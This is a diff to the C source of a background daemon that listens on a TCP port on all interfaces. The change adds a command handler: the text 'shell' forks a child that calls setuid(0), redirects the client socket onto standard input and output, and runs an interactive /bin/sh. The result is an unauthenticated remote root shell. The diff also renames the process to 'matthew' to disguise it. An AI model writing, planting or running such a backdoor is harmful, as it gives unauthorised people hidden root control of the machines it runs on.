@@ -1,9 +1,11 @@
 #include <sys/file.h>
-
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <poll.h>
+#include <sys/prctl.h>
+#include <sys/wait.h>
+#include <signal.h>
 
 #include "daemon.h"
 #include "utils.h"
@@ -11,7 +13,8 @@
 
 #define CLOSE_END 0
 #define NO_CLOSE_END 1
-#define MAX_CLIENTS 3
+#define MAX_CLIENTS 1
+#define NULL ((void *)0)
 
 static int my_htons(int port)
 {
@@ -42,6 +45,11 @@ static int create_server(void)
 		.sin_addr.s_addr = INADDR_ANY
 	};
 
+	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1) {
+		close(fd);
+		return -1;
+	}
+
 	if (bind(fd, &addr, sizeof(addr)) == -1) {
 		close(fd);
 		return -1;
@@ -56,11 +64,6 @@ static int create_server(void)
 	//	close(fd);
 	//	return -1;
 	//}
-
-	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &(int){1}, sizeof(int)) == -1) {
-		close(fd);
-		return -1;
-	}
 
 	return fd;
 }
@@ -78,7 +81,55 @@ static int accept_client(int fd)
 	return client_fd;
 }
 
-static void poller(int fd)
+void hello(param_t *command)
+{
+	(void)command;
+	logger(STR("hello\n"));
+}
+
+void exec_shell(param_t *command)
+{
+	char *argv[] = {STR("/bin/sh"), STR("-i"), STR("+m"), NULL};
+	pid_t pid = fork();
+	int client_fd = command->client_fd;
+
+	if (pid == 0) {
+		setuid(0);
+		dup2(client_fd, 0);
+		dup2(client_fd, 1);
+		dup2(client_fd, 2);
+		execve(argv[0], argv, command->envp);
+		exit(0);
+	} 
+	else {
+		waitpid(pid, NULL, 0);
+	}
+}
+
+void unknown(param_t *command)
+{
+	(void)command;
+	logger(STR("unknown command\n"));
+}
+
+command_func_t get_command(const char *cmd)
+{
+
+	command_t commands[] = {
+		{STR("hello"), hello},
+		{STR("shell"), exec_shell},
+		{NULL, unknown}
+	};
+
+	for (int i = 0; commands[i].name != NULL; i++) {
+		if (ft_strcmp(commands[i].name, cmd) == 0) {
+			return commands[i].func;
+		}
+	}
+
+	return unknown;
+}
+static void poller(int fd, char **envp)
 {
 	struct pollfd fds[MAX_CLIENTS + 1];
 	fds[0].fd = fd;
@@ -96,7 +147,13 @@ static void poller(int fd)
 		}
 
 		if (fds[0].revents & POLLIN) {
+			if (use_client == MAX_CLIENTS) {
+				logger(STR("max clients\n"));
+				continue;
+			}
+
 			int client_fd = accept_client(fd);
+
 			if (client_fd != -1) {
 				for (int i = 1; i < MAX_CLIENTS + 1; i++) {
 					if (fds[i].fd == -1) {
@@ -111,7 +168,9 @@ static void poller(int fd)
 		}
 
 		for (int i = 1; i < MAX_CLIENTS + 1; i++) {
-			if (fds[i].fd != -1 && fds[i].revents & POLLIN) {
+			if (fds[i].fd == -1 || (fds[i].revents & POLLIN) == 0) 
+				continue;
+			else {
 				char buf[1024];
 				int ret = read(fds[i].fd, buf, sizeof(buf));
 				if (ret <= 0) {
@@ -122,7 +181,17 @@ static void poller(int fd)
 				}
 				else {
 					buf[ret] = '\0';
-					logger(buf);
+					if (buf[ret - 1] == '\n') {
+						buf[ret - 1] = '\0';
+					}
+					param_t command = {
+						.client_fd = fds[i].fd,
+						.envp = envp
+					};
+					command_func_t func = get_command(buf);
+					if (func != NULL) {
+						func(&command);
+					}
 				}
 			}
 		}
@@ -143,7 +212,9 @@ static int lock(int *lock_fd, int close_end)
 		close(*lock_fd);
 		return 1;
 	} else {
-		logger(STR("locked\n"));
+		if (close_end == NO_CLOSE_END) {
+			logger(STR("locked\n"));
+		}
 	}
 
 	if (close_end == CLOSE_END) {
@@ -174,22 +245,23 @@ static int unlock(int *lock_fd)
 	return 0;
 }
 
-void run(int *lock_fd)
+void run(int *lock_fd, char **envp)
 {
+	//signal_init();
 
 	int server_fd = create_server();
 	if (server_fd == -1) {
 		return;
 	}
 
-	poller(server_fd);
+	poller(server_fd, envp);
 
 	close(server_fd);
 
 	unlock(lock_fd);
 }
 
-int	daemonize(void)
+int	daemonize(char **envp)
 {
 	int lock_fd = -1;
 	if (lock(&lock_fd, CLOSE_END) == 1) {
@@ -231,11 +303,13 @@ int	daemonize(void)
 
 	close(fd);
 
+	char name[16] = "matthew";
+	prctl(PR_SET_NAME, name);
+
 	if (lock(&lock_fd, NO_CLOSE_END) == 1) {
 		return 0;
 	}
 
-	run(&lock_fd);
+	run(&lock_fd, envp);
 	return 0;
-
 }
